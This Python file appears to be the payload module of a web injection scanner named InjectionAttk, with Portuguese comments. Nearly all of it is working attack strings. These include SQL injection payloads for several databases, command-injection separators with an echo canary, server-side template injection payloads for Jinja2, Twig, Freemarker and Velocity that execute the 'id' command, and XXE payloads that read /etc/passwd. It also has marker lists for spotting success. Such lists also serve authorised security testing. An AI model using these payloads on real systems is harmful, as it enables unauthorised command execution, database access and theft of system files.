"""
payloads.py — Payloads para InjectionAttk.
SQLi (error + time-based), Command Injection, SSTI, XXE.
Sem dependências externas — tudo inline.
"""

# ── SQL Injection ─────────────────────────────────────────────────────────────

SQLI_ERROR = [
    "'",
    "''",
    "`",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "admin'--",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1 UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "1; SELECT SLEEP(0)--",
    "\\",
    "%27",
    "%27 OR %271%27=%271",
]

SQLI_TIME = [
    # MySQL
    "' AND SLEEP(4)--",
    "\" AND SLEEP(4)--",
    "1 AND SLEEP(4)--",
    "' OR SLEEP(4)--",
    # PostgreSQL
    "'; SELECT pg_sleep(4)--",
    "1; SELECT pg_sleep(4)--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:4'--",
    "1; WAITFOR DELAY '0:0:4'--",
    # SQLite
    "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(150000000/2))))--",
    # Generic
    "1 OR 1=1 WAITFOR DELAY '0:0:4'--",
]

SQLI_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "ora-",
    "odbc driver",
    "sqlstate",
    "pg_query",
    "sqlite_",
    "unterminated quoted",
    "quoted string not properly terminated",
    "syntax error",
    "microsoft ole db",
    "you have an error in your sql",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "division by zero",
    "invalid query",
    "sql command not properly ended",
    "unexpected end of sql command",
    "unclosed quotation mark",
]

# ── Command Injection ─────────────────────────────────────────────────────────

# Canary que aparece na resposta se houver RCE
CANARY = "buggy_rce_canary_12345"

CMD_PAYLOADS = [
    # Unix
    f"; echo {CANARY}",
    f"| echo {CANARY}",
    f"&& echo {CANARY}",
    f"`echo {CANARY}`",
    f"$(echo {CANARY})",
    f"; echo {CANARY} #",
    f"|| echo {CANARY}",
    # Windows
    f"& echo {CANARY}",
    f"| echo {CANARY}",
    f"%0Aecho {CANARY}",
    # Null-byte + newline tricks
    f"\x00; echo {CANARY}",
    f"\n echo {CANARY}",
]

# ── SSTI ──────────────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    # Jinja2 / Twig / generic — espera 49
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    # Jinja2 (Python)
    "{{7*'7'}}",          # → 7777777 em Jinja2
    "{{config}}",
    "{{self.__class__}}",
    # Twig (PHP)
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    # Freemarker (Java)
    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
    # Velocity (Java)
    "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
]

SSTI_MARKERS = [
    "49",       # 7*7
    "7777777",  # 7*'7' em Jinja2
    "class ",
    "config",
    "uid=",     # saída de `id`
]

# ── XXE ───────────────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    # Leitura de arquivo local
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><data>&xxe;</data></root>""",

    # Blind via HTTP (confirma parser acessível)
    """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<root><data>&xxe;</data></root>""",

    # XInclude (quando DOCTYPE bloqueado)
    """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>""",
]

XXE_MARKERS = [
    "root:x:0",
    "bin:x:",
    "/bin/bash",
    "/bin/sh",
    "daemon:",
    "localhost",
    "hostname",
]
